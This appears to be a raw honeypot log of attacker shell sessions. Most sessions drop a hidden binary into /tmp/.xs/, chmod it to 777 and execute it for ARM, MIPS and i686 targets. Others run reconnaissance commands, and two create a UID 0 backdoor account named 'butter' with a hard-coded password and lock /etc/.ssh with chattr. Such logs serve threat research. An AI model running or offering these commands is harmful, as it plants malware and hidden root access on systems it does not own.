d97ad13976ad452c9126f7fb645cabd4	cat  > /tmp/.xs/daemon.mips.mod
d97ad13976ad452c9126f7fb645cabd4	chmod 777 /tmp/.xs/daemon.mips.mod
d97ad13976ad452c9126f7fb645cabd4	/tmp/.xs/daemon.mips.mod
bed8154c49584e2498a970c53d708d5c	mkdir /tmp/.xs/
bed8154c49584e2498a970c53d708d5c	cat  > /tmp/.xs/daemon.armv4l.mod
bed8154c49584e2498a970c53d708d5c	chmod 777 /tmp/.xs/daemon.armv4l.mod
bed8154c49584e2498a970c53d708d5c	/tmp/.xs/daemon.armv4l.mod
17967e8cf20f45a6bf5e9dc8144968e9	mkdir /tmp/.xs/
17967e8cf20f45a6bf5e9dc8144968e9	cat  > /tmp/.xs/daemon.i686.mod
17967e8cf20f45a6bf5e9dc8144968e9	chmod 777 /tmp/.xs/daemon.i686.mod
17967e8cf20f45a6bf5e9dc8144968e9	/tmp/.xs/daemon.i686.mod
6d51c03db1e44c44b760fb65171a9a81	mkdir /tmp/.xs/
6d51c03db1e44c44b760fb65171a9a81	cat  > /tmp/.xs/daemon.mips.mod
6d51c03db1e44c44b760fb65171a9a81	chmod 777 /tmp/.xs/daemon.mips.mod
6d51c03db1e44c44b760fb65171a9a81	/tmp/.xs/daemon.mips.mod
ddf7bdaf02594a3c845341a8cf2cbb4a	mkdir /tmp/.xs/
ddf7bdaf02594a3c845341a8cf2cbb4a	cat  > /tmp/.xs/daemon.armv4l.mod
ddf7bdaf02594a3c845341a8cf2cbb4a	chmod 777 /tmp/.xs/daemon.armv4l.mod
ddf7bdaf02594a3c845341a8cf2cbb4a	/tmp/.xs/daemon.armv4l.mod
f71e1e9a4b8845c580b68927ad943adc	mkdir /tmp/.xs/
f71e1e9a4b8845c580b68927ad943adc	cat  > /tmp/.xs/daemon.i686.mod
f71e1e9a4b8845c580b68927ad943adc	chmod 777 /tmp/.xs/daemon.i686.mod
f71e1e9a4b8845c580b68927ad943adc	/tmp/.xs/daemon.i686.mod
96deeb34c06247fea0ebc5694ea612af	mkdir /tmp/.xs/
96deeb34c06247fea0ebc5694ea612af	cat  > /tmp/.xs/daemon.mips.mod
96deeb34c06247fea0ebc5694ea612af	chmod 777 /tmp/.xs/daemon.mips.mod
96deeb34c06247fea0ebc5694ea612af	/tmp/.xs/daemon.mips.mod
7c550aacedb2488cacea1596a02cb576	mkdir /tmp/.xs/
7c550aacedb2488cacea1596a02cb576	cat  > /tmp/.xs/daemon.armv4l.mod
7c550aacedb2488cacea1596a02cb576	chmod 777 /tmp/.xs/daemon.armv4l.mod
7c550aacedb2488cacea1596a02cb576	/tmp/.xs/daemon.armv4l.mod
2bf67cd591334a2aa04c2e38a7d84e7f	mkdir /tmp/.xs/
2bf67cd591334a2aa04c2e38a7d84e7f	cat  > /tmp/.xs/daemon.i686.mod
2bf67cd591334a2aa04c2e38a7d84e7f	chmod 777 /tmp/.xs/daemon.i686.mod
2bf67cd591334a2aa04c2e38a7d84e7f	/tmp/.xs/daemon.i686.mod
49ba20eafb0843ed9071c49fda1d6441	mkdir /tmp/.xs/
49ba20eafb0843ed9071c49fda1d6441	cat  > /tmp/.xs/daemon.mips.mod
49ba20eafb0843ed9071c49fda1d6441	chmod 777 /tmp/.xs/daemon.mips.mod
49ba20eafb0843ed9071c49fda1d6441	/tmp/.xs/daemon.mips.mod
c154ecea7d874329aa6324651287a87c	mkdir /tmp/.xs/
c154ecea7d874329aa6324651287a87c	cat  > /tmp/.xs/daemon.armv4l.mod
c154ecea7d874329aa6324651287a87c	chmod 777 /tmp/.xs/daemon.armv4l.mod
c154ecea7d874329aa6324651287a87c	/tmp/.xs/daemon.armv4l.mod
da45d1dc6d9c486b9c38dda9ada8e285	mkdir /tmp/.xs/
da45d1dc6d9c486b9c38dda9ada8e285	cat  > /tmp/.xs/daemon.i686.mod
da45d1dc6d9c486b9c38dda9ada8e285	chmod 777 /tmp/.xs/daemon.i686.mod
da45d1dc6d9c486b9c38dda9ada8e285	/tmp/.xs/daemon.i686.mod
0966795f3f074c80af5ced354b7613b5	mkdir /tmp/.xs/
0966795f3f074c80af5ced354b7613b5	cat  > /tmp/.xs/daemon.mips.mod
0966795f3f074c80af5ced354b7613b5	chmod 777 /tmp/.xs/daemon.mips.mod
0966795f3f074c80af5ced354b7613b5	/tmp/.xs/daemon.mips.mod
7711fb350a4f4ddcad2f083a0647650c	mkdir /tmp/.xs/
7711fb350a4f4ddcad2f083a0647650c	cat  > /tmp/.xs/daemon.mipsel.mod
7711fb350a4f4ddcad2f083a0647650c	chmod 777 /tmp/.xs/daemon.mipsel.mod
7711fb350a4f4ddcad2f083a0647650c	/tmp/.xs/daemon.mipsel.mod
79415ab71e4e423c8ea123387b73565b	mkdir /tmp/.xs/
79415ab71e4e423c8ea123387b73565b	cat  > /tmp/.xs/test.mod
79415ab71e4e423c8ea123387b73565b	chmod 777 /tmp/.xs/test.mod
79415ab71e4e423c8ea123387b73565b	/tmp/.xs/test.mod
404279f405ca46b3a90ee4d6fbdca875	mkdir /tmp/.xs/
404279f405ca46b3a90ee4d6fbdca875	cat  > /tmp/.xs/daemon.armv4l.mod
404279f405ca46b3a90ee4d6fbdca875	chmod 777 /tmp/.xs/daemon.armv4l.mod
404279f405ca46b3a90ee4d6fbdca875	/tmp/.xs/daemon.armv4l.mod
ee3a3ac03b61432eab356145b10f2259	mkdir /tmp/.xs/
ee3a3ac03b61432eab356145b10f2259	cat  > /tmp/.xs/daemon.i686.mod
ee3a3ac03b61432eab356145b10f2259	chmod 777 /tmp/.xs/daemon.i686.mod
ee3a3ac03b61432eab356145b10f2259	/tmp/.xs/daemon.i686.mod
ec55770131bf455eac7e20e3ee64f3d9	mkdir /tmp/.xs/
ec55770131bf455eac7e20e3ee64f3d9	cat  > /tmp/.xs/daemon.mips.mod
ec55770131bf455eac7e20e3ee64f3d9	chmod 777 /tmp/.xs/daemon.mips.mod
ec55770131bf455eac7e20e3ee64f3d9	/tmp/.xs/daemon.mips.mod
094206ec1acf445ab2498b505a3f84af	mkdir /tmp/.xs/
094206ec1acf445ab2498b505a3f84af	cat  > /tmp/.xs/daemon.armv4l.mod
094206ec1acf445ab2498b505a3f84af	chmod 777 /tmp/.xs/daemon.armv4l.mod
094206ec1acf445ab2498b505a3f84af	/tmp/.xs/daemon.armv4l.mod
be31402b44134ff1a15ef0b685356aa1	mkdir /tmp/.xs/
be31402b44134ff1a15ef0b685356aa1	cat  > /tmp/.xs/daemon.i686.mod
be31402b44134ff1a15ef0b685356aa1	chmod 777 /tmp/.xs/daemon.i686.mod
be31402b44134ff1a15ef0b685356aa1	/tmp/.xs/daemon.i686.mod
54844cccc84c41b88a90d32790b26f51	mkdir /tmp/.xs/
54844cccc84c41b88a90d32790b26f51	cat  > /tmp/.xs/daemon.mips.mod
54844cccc84c41b88a90d32790b26f51	chmod 777 /tmp/.xs/daemon.mips.mod
54844cccc84c41b88a90d32790b26f51	/tmp/.xs/daemon.mips.mod
279599c0769a4bbaaf33a35091e730f8	mkdir /tmp/.xs/
279599c0769a4bbaaf33a35091e730f8	cat  > /tmp/.xs/daemon.armv4l.mod
279599c0769a4bbaaf33a35091e730f8	chmod 777 /tmp/.xs/daemon.armv4l.mod
279599c0769a4bbaaf33a35091e730f8	/tmp/.xs/daemon.armv4l.mod
9f30d425131349a68c340f873666b3db	mkdir /tmp/.xs/
9f30d425131349a68c340f873666b3db	cat  > /tmp/.xs/daemon.i686.mod
9f30d425131349a68c340f873666b3db	chmod 777 /tmp/.xs/daemon.i686.mod
9f30d425131349a68c340f873666b3db	/tmp/.xs/daemon.i686.mod
91e464e3e0cd46dfb0c211a697cdfbeb	mkdir /tmp/.xs/
91e464e3e0cd46dfb0c211a697cdfbeb	cat  > /tmp/.xs/daemon.mips.mod
91e464e3e0cd46dfb0c211a697cdfbeb	chmod 777 /tmp/.xs/daemon.mips.mod
91e464e3e0cd46dfb0c211a697cdfbeb	/tmp/.xs/daemon.mips.mod
41c49ac5a0d344c8a277b1244a4f824c	mkdir /tmp/.xs/
41c49ac5a0d344c8a277b1244a4f824c	cat  > /tmp/.xs/daemon.mipsel.mod
41c49ac5a0d344c8a277b1244a4f824c	chmod 777 /tmp/.xs/daemon.mipsel.mod
41c49ac5a0d344c8a277b1244a4f824c	/tmp/.xs/daemon.mipsel.mod
c8cbc647b55e4474b6a6f32d2a87b1b4	mkdir /tmp/.xs/
c8cbc647b55e4474b6a6f32d2a87b1b4	cat  > /tmp/.xs/test.mod
c8cbc647b55e4474b6a6f32d2a87b1b4	chmod 777 /tmp/.xs/test.mod
c8cbc647b55e4474b6a6f32d2a87b1b4	/tmp/.xs/test.mod
ae8e6f52291945c99045ae8427819c2d	mkdir /tmp/.xs/
ae8e6f52291945c99045ae8427819c2d	cat  > /tmp/.xs/daemon.armv4l.mod
ae8e6f52291945c99045ae8427819c2d	chmod 777 /tmp/.xs/daemon.armv4l.mod
ae8e6f52291945c99045ae8427819c2d	/tmp/.xs/daemon.armv4l.mod
2f0ebb2a812a4f569c31496545be939b	mkdir /tmp/.xs/
2f0ebb2a812a4f569c31496545be939b	cat  > /tmp/.xs/daemon.i686.mod
2f0ebb2a812a4f569c31496545be939b	chmod 777 /tmp/.xs/daemon.i686.mod
2f0ebb2a812a4f569c31496545be939b	/tmp/.xs/daemon.i686.mod
7a0335b6cf2f4fa7b5e404edcf2b5c9a	mkdir /tmp/.xs/
7a0335b6cf2f4fa7b5e404edcf2b5c9a	cat  > /tmp/.xs/daemon.mips.mod
7a0335b6cf2f4fa7b5e404edcf2b5c9a	chmod 777 /tmp/.xs/daemon.mips.mod
7a0335b6cf2f4fa7b5e404edcf2b5c9a	/tmp/.xs/daemon.mips.mod
b0ab1ea8cb72495abd6c6c0717edd38d	mkdir /tmp/.xs/
b0ab1ea8cb72495abd6c6c0717edd38d	cat  > /tmp/.xs/daemon.armv4l.mod
b0ab1ea8cb72495abd6c6c0717edd38d	chmod 777 /tmp/.xs/daemon.armv4l.mod
b0ab1ea8cb72495abd6c6c0717edd38d	/tmp/.xs/daemon.armv4l.mod
3fc9a3fe61994b629b5d7e4781e3d8c3	mkdir /tmp/.xs/
3fc9a3fe61994b629b5d7e4781e3d8c3	cat  > /tmp/.xs/daemon.i686.mod
3fc9a3fe61994b629b5d7e4781e3d8c3	chmod 777 /tmp/.xs/daemon.i686.mod
3fc9a3fe61994b629b5d7e4781e3d8c3	/tmp/.xs/daemon.i686.mod
6abd8bc7e192402185bc847d071a3aa9	mkdir /tmp/.xs/
6abd8bc7e192402185bc847d071a3aa9	cat  > /tmp/.xs/daemon.mips.mod
6abd8bc7e192402185bc847d071a3aa9	chmod 777 /tmp/.xs/daemon.mips.mod
6abd8bc7e192402185bc847d071a3aa9	/tmp/.xs/daemon.mips.mod
c137018ba54749598af03514995baca1	mkdir /tmp/.xs/
c137018ba54749598af03514995baca1	cat  > /tmp/.xs/daemon.armv4l.mod
c137018ba54749598af03514995baca1	chmod 777 /tmp/.xs/daemon.armv4l.mod
c137018ba54749598af03514995baca1	/tmp/.xs/daemon.armv4l.mod
1e279dbb1edd4a58a0989d04eb251011	mkdir /tmp/.xs/
1e279dbb1edd4a58a0989d04eb251011	cat  > /tmp/.xs/daemon.i686.mod
1e279dbb1edd4a58a0989d04eb251011	chmod 777 /tmp/.xs/daemon.i686.mod
1e279dbb1edd4a58a0989d04eb251011	/tmp/.xs/daemon.i686.mod
c91eb19b16a842e792de53736c30373b	mkdir /tmp/.xs/
c91eb19b16a842e792de53736c30373b	cat  > /tmp/.xs/daemon.mips.mod
c91eb19b16a842e792de53736c30373b	chmod 777 /tmp/.xs/daemon.mips.mod
c91eb19b16a842e792de53736c30373b	/tmp/.xs/daemon.mips.mod
ef668cd8c7464277a634d37a68980959	mkdir /tmp/.xs/
ef668cd8c7464277a634d37a68980959	cat  > /tmp/.xs/daemon.armv4l.mod
ef668cd8c7464277a634d37a68980959	chmod 777 /tmp/.xs/daemon.armv4l.mod
ef668cd8c7464277a634d37a68980959	/tmp/.xs/daemon.armv4l.mod
ebc798a399314d56b4a58e610a7c0eec	mkdir /tmp/.xs/
ebc798a399314d56b4a58e610a7c0eec	cat  > /tmp/.xs/daemon.i686.mod
ebc798a399314d56b4a58e610a7c0eec	chmod 777 /tmp/.xs/daemon.i686.mod
ebc798a399314d56b4a58e610a7c0eec	/tmp/.xs/daemon.i686.mod
ce180b55a9a94c56b54f68c06b22eb49	mkdir /tmp/.xs/
ce180b55a9a94c56b54f68c06b22eb49	cat  > /tmp/.xs/daemon.mips.mod
ce180b55a9a94c56b54f68c06b22eb49	chmod 777 /tmp/.xs/daemon.mips.mod
ce180b55a9a94c56b54f68c06b22eb49	/tmp/.xs/daemon.mips.mod
d84a889961654555994b7413add605ea	mkdir /tmp/.xs/
d84a889961654555994b7413add605ea	cat  > /tmp/.xs/daemon.armv4l.mod
d84a889961654555994b7413add605ea	chmod 777 /tmp/.xs/daemon.armv4l.mod
d84a889961654555994b7413add605ea	/tmp/.xs/daemon.armv4l.mod
d672f0b44aac47ad9a023ae26d48d0df	mkdir /tmp/.xs/
d672f0b44aac47ad9a023ae26d48d0df	cat  > /tmp/.xs/daemon.i686.mod
d672f0b44aac47ad9a023ae26d48d0df	chmod 777 /tmp/.xs/daemon.i686.mod
d672f0b44aac47ad9a023ae26d48d0df	/tmp/.xs/daemon.i686.mod
470056009bb645ef80cfbdbe7170af34	mkdir /tmp/.xs/
470056009bb645ef80cfbdbe7170af34	cat  > /tmp/.xs/daemon.mips.mod
470056009bb645ef80cfbdbe7170af34	chmod 777 /tmp/.xs/daemon.mips.mod
470056009bb645ef80cfbdbe7170af34	/tmp/.xs/daemon.mips.mod
5e30def5d66e4332a7e6e1f65b6605fd	mkdir /tmp/.xs/
5e30def5d66e4332a7e6e1f65b6605fd	cat  > /tmp/.xs/daemon.armv4l.mod
5e30def5d66e4332a7e6e1f65b6605fd	chmod 777 /tmp/.xs/daemon.armv4l.mod
5e30def5d66e4332a7e6e1f65b6605fd	/tmp/.xs/daemon.armv4l.mod
209b44691cb849be8e9353ac1ae2eb89	mkdir /tmp/.xs/
209b44691cb849be8e9353ac1ae2eb89	cat  > /tmp/.xs/daemon.i686.mod
209b44691cb849be8e9353ac1ae2eb89	chmod 777 /tmp/.xs/daemon.i686.mod
209b44691cb849be8e9353ac1ae2eb89	/tmp/.xs/daemon.i686.mod
7191db7ce03245bdabc89ac748ca6555	mkdir /tmp/.xs/
7191db7ce03245bdabc89ac748ca6555	cat  > /tmp/.xs/daemon.mips.mod
7191db7ce03245bdabc89ac748ca6555	chmod 777 /tmp/.xs/daemon.mips.mod
7191db7ce03245bdabc89ac748ca6555	/tmp/.xs/daemon.mips.mod
4cb1b815ff0644308af74183948c29ce	id
4febc0f6bf104ba3aa4b506a26a8727e	uname -m
4febc0f6bf104ba3aa4b506a26a8727e	uname -r
4febc0f6bf104ba3aa4b506a26a8727e	useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter
4febc0f6bf104ba3aa4b506a26a8727e	echo "xuelp123" | passwd --stdin butter
4febc0f6bf104ba3aa4b506a26a8727e	echo butter:xuelp123 | chpasswd
4febc0f6bf104ba3aa4b506a26a8727e	chattr +i /etc/.ssh
c20450347b5c4502b1527b6a0958f806	uname -m
c20450347b5c4502b1527b6a0958f806	uname -r
5eaa710fc4b145abad3197ef0851c397	uname -m
5eaa710fc4b145abad3197ef0851c397	uname -r
5eaa710fc4b145abad3197ef0851c397	useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter
5eaa710fc4b145abad3197ef0851c397	echo "xuelp123" | passwd --stdin butter
5eaa710fc4b145abad3197ef0851c397	echo butter:xuelp123 | chpassw
faae3dafe17448e8875fc0e0377c9e20	mkdir /tmp/.xs/
faae3dafe17448e8875fc0e0377c9e20	cat  > /tmp/.xs/daemon.armv4l.mod
faae3dafe17448e8875fc0e0377c9e20	chmod 777 /tmp/.xs/daemon.armv4l.mod
faae3dafe17448e8875fc0e0377c9e20	/tmp/.xs/daemon.armv4l.mod
2b0f4c23dbd24f31bbf77509ccaf7c25	mkdir /tmp/.xs/
2b0f4c23dbd24f31bbf77509ccaf7c25	cat  > /tmp/.xs/daemon.i686.mod
2b0f4c23dbd24f31bbf77509ccaf7c25	chmod 777 /tmp/.xs/daemon.i686.mod
2b0f4c23dbd24f31bbf77509ccaf7c25	/tmp/.xs/daemon.i686.mod
2c4dcd89b76240dbbdc029354bd1ca38	mkdir /tmp/.xs/
2c4dcd89b76240dbbdc029354bd1ca38	cat  > /tmp/.xs/daemon.mips.mod
2c4dcd89b76240dbbdc029354bd1ca38	chmod 777 /tmp/.xs/daemon.mips.mod
2c4dcd89b76240dbbdc029354bd1ca38	/tmp/.xs/daemon.mips.mod
3f1b0e04f89544b0961503e31d163e11	mkdir /tmp/.xs/
3f1b0e04f89544b0961503e31d163e11	cat  > /tmp/.xs/daemon.armv4l.mod
3f1b0e04f89544b0961503e31d163e11	chmod 777 /tmp/.xs/daemon.armv4l.mod
3f1b0e04f89544b0961503e31d163e11	/tmp/.xs/daemon.armv4l.mod
f512d5b7f9e44782a9f7d0aa6cf3d3d6	mkdir /tmp/.xs/
f512d5b7f9e44782a9f7d0aa6cf3d3d6	cat  > /tmp/.xs/daemon.i686.mod
f512d5b7f9e44782a9f7d0aa6cf3d3d6	chmod 777 /tmp/.xs/daemon.i686.mod
f512d5b7f9e44782a9f7d0aa6cf3d3d6	/tmp/.xs/daemon.i686.mod
5e0ba6f965d948f98f1954139540115a	mkdir /tmp/.xs/
5e0ba6f965d948f98f1954139540115a	cat  > /tmp/.xs/daemon.mips.mod
5e0ba6f965d948f98f1954139540115a	chmod 777 /tmp/.xs/daemon.mips.mod
5e0ba6f965d948f98f1954139540115a	/tmp/.xs/daemon.mips.mod
d1990c1a582a487f9b9068e29d95a4e9	mkdir /tmp/.xs/
d1990c1a582a487f9b9068e29d95a4e9	cat  > /tmp/.xs/daemon.armv4l.mod
d1990c1a582a487f9b9068e29d95a4e9	chmod 777 /tmp/.xs/daemon.armv4l.mod
d1990c1a582a487f9b9068e29d95a4e9	/tmp/.xs/daemon.armv4l.mod
6bd70eaf23aa465881b311598fa0a13f	mkdir /tmp/.xs/
6bd70eaf23aa465881b311598fa0a13f	cat  > /tmp/.xs/daemon.i686.mod
6bd70eaf23aa465881b311598fa0a13f	chmod 777 /tmp/.xs/daemon.i686.mod
6bd70eaf23aa465881b311598fa0a13f	/tmp/.xs/daemon.i686.mod
6bb48b43ba0c433aaea79d3d85ef861f	mkdir /tmp/.xs/
6bb48b43ba0c433aaea79d3d85ef861f	cat  > /tmp/.xs/daemon.mips.mod
6bb48b43ba0c433aaea79d3d85ef861f	chmod 777 /tmp/.xs/daemon.mips.mod
6bb48b43ba0c433aaea79d3d85ef861f	/tmp/.xs/daemon.mips.mod
b559f8e99c2542c2ae97f3e1ee1760d4	mkdir /tmp/.xs/
b559f8e99c2542c2ae97f3e1ee1760d4	cat  > /tmp/.xs/daemon.armv4l.mod
b559f8e99c2542c2ae97f3e1ee1760d4	chmod 777 /tmp/.xs/daemon.armv4l.mod
b559f8e99c2542c2ae97f3e1ee1760d4	/tmp/.xs/daemon.armv4l.mod
1c1f075c1a1c44f589f33609127ff488	mkdir /tmp/.xs/
1c1f075c1a1c44f589f33609127ff488	cat  > /tmp/.xs/daemon.i686.mod
1c1f075c1a1c44f589f33609127ff488	chmod 777 /tmp/.xs/daemon.i686.mod
1c1f075c1a1c44f589f33609127ff488	/tmp/.xs/daemon.i686.mod
dbacd4cbb82d4aaea321f53c53186073	mkdir /tmp/.xs/
dbacd4cbb82d4aaea321f53c53186073	cat  > /tmp/.xs/daemon.mips.mod
dbacd4cbb82d4aaea321f53c53186073	chmod 777 /tmp/.xs/daemon.mips.mod
dbacd4cbb82d4aaea321f53c53186073	/tmp/.xs/daemon.mips.mod
bac09f1291514dbaa7c8eaa08581973a	mkdir /tmp/.xs/
bac09f1291514dbaa7c8eaa08581973a	cat  > /tmp/.xs/daemon.armv4l.mod
bac09f1291514dbaa7c8eaa08581973a	chmod 777 /tmp/.xs/daemon.armv4l.mod
bac09f1291514dbaa7c8eaa08581973a	/tmp/.xs/daemon.armv4l.mod
9cd8b2e432284ae08c003fddab7a761f	mkdir /tmp/.xs/
9cd8b2e432284ae08c003fddab7a761f	cat  > /tmp/.xs/daemon.i686.mod
9cd8b2e432284ae08c003fddab7a761f	chmod 777 /tmp/.xs/daemon.i686.mod
9cd8b2e432284ae08c003fddab7a761f	/tmp/.xs/daemon.i686.mod
c1ab206893ef4456bc7cab3f6e44e89e	mkdir /tmp/.xs/
c1ab206893ef4456bc7cab3f6e44e89e	cat  > /tmp/.xs/daemon.mips.mod
c1ab206893ef4456bc7cab3f6e44e89e	chmod 777 /tmp/.xs/daemon.mips.mod
c1ab206893ef4456bc7cab3f6e44e89e	/tmp/.xs/daemon.mips.mod
34fe1e2c180a4b4e96fdcc1d7783500a	uname
34fe1e2c180a4b4e96fdcc1d7783500a	free -m
34fe1e2c180a4b4e96fdcc1d7783500a	ps x
dcefc9ac287743e3bf39c4c4d87250ca	mkdir /tmp/.xs/
dcefc9ac287743e3bf39c4c4d87250ca	cat  > /tmp/.xs/daemon.armv4l.mod
dcefc9ac287743e3bf39c4c4d87250ca	chmod 777 /tmp/.xs/daemon.armv4l.mod
dcefc9ac287743e3bf39c4c4d87250ca	/tmp/.xs/daemon.armv4l.mod
7c57ae27a3724cea90bff9e58acfd256	mkdir /tmp/.xs/
7c57ae27a3724cea90bff9e58acfd256	cat  > /tmp/.xs/daemon.i686.mod
7c57ae27a3724cea90bff9e58acfd256	chmod 777 /tmp/.xs/daemon.i686.mod
7c57ae27a3724cea90bff9e58acfd256	/tmp/.xs/daemon.i686.mod
5ff80d7076b34a348ae85e7a3df6c0f7	mkdir /tmp/.xs/
5ff80d7076b34a348ae85e7a3df6c0f7	cat  > /tmp/.xs/daemon.mips.mod
5ff80d7076b34a348ae85e7a3df6c0f7	chmod 777 /tmp/.xs/daemon.mips.mod
5ff80d7076b34a348ae85e7a3df6c0f7	/tmp/.xs/daemon.mips.mod
83a79b9087204bca859b1bb9056690f3	mkdir /tmp/.xs/
83a79b9087204bca859b1bb9056690f3	cat  > /tmp/.xs/daemon.armv4l.mod
83a79b9087204bca859b1bb9056690f3	chmod 777 /tmp/.xs/daemon.armv4l.mod
83a79b9087204bca859b1bb9056690f3	/tmp/.xs/daemon.armv4l.mod
a551aee9c4e44f4f9d665e434b29430f	mkdir /tmp/.xs/
a551aee9c4e44f4f9d665e434b29430f	cat  > /tmp/.xs/daemon.i686.mod
a551aee9c4e44f4f9d665e434b29430f	chmod 777 /tmp/.xs/daemon.i686.mod
a551aee9c4e44f4f9d665e434b29430f	/tmp/.xs/daemon.i686.mod
ba38a20cd8c54106813008c31e028737	mkdir /tmp/.xs/
ba38a20cd8c54106813008c31e028737	cat  > /tmp/.xs/daemon.mips.mod
ba38a20cd8c54106813008c31e028737	chmod 777 /tmp/.xs/daemon.mips.mod
ba38a20cd8c54106813008c31e028737	/tmp/.xs/daemon.mips.mod
bf805c4a55904e04bd74ed554ac7b780	mkdir /tmp/.xs/
bf805c4a55904e04bd74ed554ac7b780	cat  > /tmp/.xs/daemon.armv4l.mod
bf805c4a55904e04bd74ed554ac7b780	chmod 777 /tmp/.xs/daemon.armv4l.mod
bf805c4a55904e04bd74ed554ac7b780	/tmp/.xs/daemon.armv4l.mod
c7a18e6de9e14933a7a981c9df9050ae	mkdir /tmp/.xs/
c7a18e6de9e14933a7a981c9df9050ae	cat  > /tmp/.xs/daemon.i686.mod
c7a18e6de9e14933a7a981c9df9050ae	chmod 777 /tmp/.xs/daemon.i686.mod
c7a18e6de9e14933a7a981c9df9050ae	/tmp/.xs/daemon.i686.mod
ab63dda2994745dd93112dc0d75cbd76	mkdir /tmp/.xs/
ab63dda2994745dd93112dc0d75cbd76	cat  > /tmp/.xs/daemon.mips.mod
ab63dda2994745dd93112dc0d75cbd76	chmod 777 /tmp/.xs/daemon.mips.mod
ab63dda2994745dd93112dc0d75cbd76	/tmp/.xs/daemon.mips.mod
d7d39167397c43c0803237b8f829e2c9	mkdir /tmp/.xs/
d7d39167397c43c0803237b8f829e2c9	cat  > /tmp/.xs/daemon.armv4l.mod
d7d39167397c43c0803237b8f829e2c9	chmod 777 /tmp/.xs/daemon.armv4l.mod
d7d39167397c43c0803237b8f829e2c9	/tmp/.xs/daemon.armv4l.mod
212c8d25cbba49659933359fcb1bf35c	echo -n test
212c8d25cbba49659933359fcb1bf35c	cat /proc/version
e9d70878bc39492ca16856d1c3168abc	mkdir /tmp/.xs/
e9d70878bc39492ca16856d1c3168abc	cat  > /tmp/.xs/daemon.armv4l.mod
e9d70878bc39492ca16856d1c3168abc	chmod 777 /tmp/.xs/daemon.armv4l.mod
e9d70878bc39492ca16856d1c3168abc	/tmp/.xs/daemon.armv4l.mod
124a7a8577354f32bf1770c51beee81d	mkdir /tmp/.xs/
124a7a8577354f32bf1770c51beee81d	cat  > /tmp/.xs/daemon.i686.mod
124a7a8577354f32bf1770c51beee81d	chmod 777 /tmp/.xs/daemon.i686.mod
124a7a8577354f32bf1770c51beee81d	/tmp/.xs/daemon.i686.mod
44d482b6684e4799b1bec3a366b9126a	mkdir /tmp/.xs/
44d482b6684e4799b1bec3a366b9126a	cat  > /tmp/.xs/daemon.mips.mod
44d482b6684e4799b1bec3a366b9126a	chmod 777 /tmp/.xs/daemon.mips.mod
44d482b6684e4799b1bec3a366b9126a	/tmp/.xs/daemon.mips.mod
9de544cb09314ada8ebb9c59f79b47ad	mkdir /tmp/.xs/
9de544cb09314ada8ebb9c59f79b47ad	cat  > /tmp/.xs/daemon.mipsel.mod
9de544cb09314ada8ebb9c59f79b47ad	chmod 777 /tmp/.xs/daemon.mipsel.mod
9de544cb09314ada8ebb9c59f79b47ad	/tmp/.xs/daemon.mipsel.mod
f1bbfab0ddad4e72a088f46c9f11df9a	mkdir /tmp/.xs/
f1bbfab0ddad4e72a088f46c9f11df9a	cat  > /tmp/.xs/test.mod
f1bbfab0ddad4e72a088f46c9f11df9a	chmod 777 /tmp/.xs/test.mod
f1bbfab0ddad4e72a088f46c9f11df9a	/tmp/.xs/test.mod
cc484561cdb845faae5849204a61019c	echo -n test
cc484561cdb845faae5849204a61019c	cat /proc/version
eafbbdfdcecb451ba5552c2944be3f55	mkdir /tmp/.xs/
eafbbdfdcecb451ba5552c2944be3f55	cat  > /tmp/.xs/daemon.armv4l.mod
eafbbdfdcecb451ba5552c2944be3f55	chmod 777 /tmp/.xs/daemon.armv4l.mod
eafbbdfdcecb451ba5552c2944be3f55	/tmp/.xs/daemon.armv4l.mod
c874c31ddcca445cbc8498ee91bd0d07	mkdir /tmp/.xs/
c874c31ddcca445cbc8498ee91bd0d07	cat  > /tmp/.xs/daemon.i686.mod
c874c31ddcca445cbc8498ee91bd0d07	chmod 777 /tmp/.xs/daemon.i686.mod
c874c31ddcca445cbc8498ee91bd0d07	/tmp/.xs/daemon.i686.mod
1c73d28abd8f4246b8538ef98a399730	mkdir /tmp/.xs/
1c73d28abd8f4246b8538ef98a399730	cat  > /tmp/.xs/daemon.mips.mod
1c73d28abd8f4246b8538ef98a399730	chmod 777 /tmp/.xs/daemon.mips.mod
1c73d28abd8f4246b8538ef98a399730	/tmp/.xs/daemon.mips.mod
ddb83137a4d3486f8f50173dd2969b8c	mkdir /tmp/.xs/
ddb83137a4d3486f8f50173dd2969b8c	cat  > /tmp/.xs/daemon.mipsel.mod
ddb83137a4d3486f8f50173dd2969b8c	chmod 777 /tmp/.xs/daemon.mipsel.mod
ddb83137a4d3486f8f50173dd2969b8c	/tmp/.xs/daemon.mipsel.mod
